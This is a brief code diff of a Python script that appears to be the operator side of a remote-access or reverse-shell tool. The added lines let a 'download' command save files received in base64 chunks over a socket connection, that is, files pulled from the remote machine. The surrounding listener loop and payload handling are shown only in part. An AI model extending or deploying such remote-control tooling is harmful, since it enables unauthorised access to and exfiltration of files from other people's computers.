@@ -32,6 +32,10 @@ while 1:
             print(len_chunks)
             for i in range(int(len_chunks)):
                 result =decode64(conn.recv(1024))
+                if "download" in payload:
+                    file_name = payload.split(" ")
+                    with open(f"./{file_name[1]}","ab") as file:
+                        file.write(result)
                 print(result.decode())
     except KeyboardInterrupt:
         print("\nClosing connection")
